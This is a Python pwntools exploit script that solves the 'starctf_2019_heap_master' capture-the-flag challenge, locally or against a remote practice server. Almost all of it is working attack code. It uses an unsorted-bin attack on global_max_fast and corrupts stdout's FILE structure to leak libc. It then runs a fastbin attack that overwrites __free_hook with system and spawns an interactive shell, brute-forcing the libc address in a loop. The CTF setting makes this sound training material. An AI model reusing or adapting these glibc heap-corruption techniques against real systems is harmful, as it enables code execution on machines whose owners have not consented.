import sys
from pwn_debug.pwn_debug import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./starctf_2019_heap_master')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./starctf_2019_heap_master')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',27070)
			elf=ELF('./starctf_2019_heap_master')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a):
			io.sendlineafter('>> ','1')
			io.sendlineafter('size: ',str(a))
			
		def delete(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter('offset: ',str(a))

		def edit(a,b,c):
			io.sendlineafter('>> ','2')
			io.sendlineafter('offset: ',str(a))
			io.sendlineafter('size: ',str(b))
			io.sendafter('content: ',c)
		

		def m_add(size):
			#io.recvuntil(">> ")
			io.sendline("1")
			#io.recvuntil("size: ")
			io.sendline(str(size))

		def m_edit(offset,size,content):
			#io.recvuntil(">> ")
			io.sendline("2")
			#io.recvuntil("offset: ")
			io.sendline(str(offset))
			#io.recvuntil("size: ")
			io.sendline(str(size))
			#io.recvuntil("content: ")
			io.send(content)

		def m_delete(offset):
			#p.recvuntil(">> ")
			io.sendline("3")
			#p.recvuntil("offset: ")
			io.sendline(str(offset))

		


	
		data=p64(0)+p64(0x21)
		edit(0,0x10,data)
		data=p64(0)+p64(0x91)
		edit(0x20,0x10,data)
		data=p64(0)+p64(0x21)
		edit(0x20+0x90,0x10,data)
		edit(0x20+0x90+0x20,0x10,data)


		#pdbg.bp(0xecb)

		delete(0x20+0x10)
		#guess_addr=membio.libc_base  ## use this if you're debug the program now
		## brute guess libc address is 0xd000
		guess_addr= 0xd000
		heap_max_fast=guess_addr+0x3c67f8
		fastbin_ptr=guess_addr+libc.symbols['__malloc_hook']+0x188
		data=p16((heap_max_fast-0x10)&0xffff)
		## step 1 unsorted bin attack 
		edit(0x38,2,data)
		## overwrite global_max_fast to big value
		add(0x80)

		stdout_addr=guess_addr+libc.symbols['_IO_2_1_stdout_']
		write_base=stdout_addr+0x20
		read_end=stdout_addr+0x10
		write_ptr=stdout_addr+0x28
		write_end=stdout_addr+0x30


		## overwrite stdout read_end to heap address
		idx=(read_end-fastbin_ptr)/8
		size=idx*0x10+0x20
		print "size1:",hex(size)
		size=0x1630
		data=p64(size+1)
		edit(0x38,8,data)
		data=p64(0)+p64(0x21)
		edit(0x30+size,0x10,data)
		delete(0x40)

		## overwrite stdout write end to heap address
		idx=(write_end-fastbin_ptr)/8
		size=idx*0x10+0x20
		print "size2:",hex(size)
		size=0x1670
		data=p64(size+1)
		m_edit(0x48,8,data)
		data=p64(0)+p64(0x21)
		m_edit(0x40+size,0x10,data)
		m_delete(0x50)


		## overwrite stdout write ptr to heap address
		idx=(write_ptr-fastbin_ptr)/8
		size=idx*0x10+0x20
		print "size3:",hex(size)
		size=0x1660
		data=p64(size+1)
		m_edit(0x48,8,data)
		data=p64(0)+p64(0x21)
		m_edit(0x40+size,0x10,data)
		m_delete(0x50)

		## overwrite stdout write base to heap address
		idx=(write_base-fastbin_ptr)/8
		size=idx*0x10+0x20
		print "size4:",hex(size)
		size=0x1650
		data=p64(size+1)
		m_edit(0x38,8,data)
		data=p64(0)+p64(0x21)
		m_edit(0x30+size,0x10,data)
		# gdb.attach(io)
		m_delete(0x40)


		## step 2 trigger printf and leak address
		libc_base=u64(io.recv(8))-libc.symbols['__malloc_hook']-0x68
		#libc_base=u64(io.recv(8))-0x3c4b20-0x58
		log.info("leak libc base: %s"%hex(libc_base))



		#pdbg.bp([0xecb,0xf00])
		free_hook=libc_base+libc.symbols['__free_hook']
		system_addr=libc_base+libc.symbols['system']
		fastbin_ptr=libc_base+libc.symbols['__malloc_hook']+0x18
		log.info("system addr: %s"%hex(system_addr))
		idx=(free_hook-fastbin_ptr)/8
		size=idx*0x10+0x20
		print hex(size)
		size=0x3920
		#print hex(size)
		data=p64(size+1)
		m_edit(0x38,8,data)
		data=p64(0)+p64(0x21)
		m_edit(0x30+size,0x10,data)
		m_delete(0x40)
		## step 3 fastbin attack
		edit(0x40,8,p64(system_addr))
		add(0x3910)

		data='/bin/sh\x00'
		edit(0x110,8,data)
		## step 4 get shell
		#pdbg.bp(0xecb)
		delete(0x110)
		#pdbg.bp(0xecb)
		io.recvuntil(">> offset: ")

		io.sendline("ls")
		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue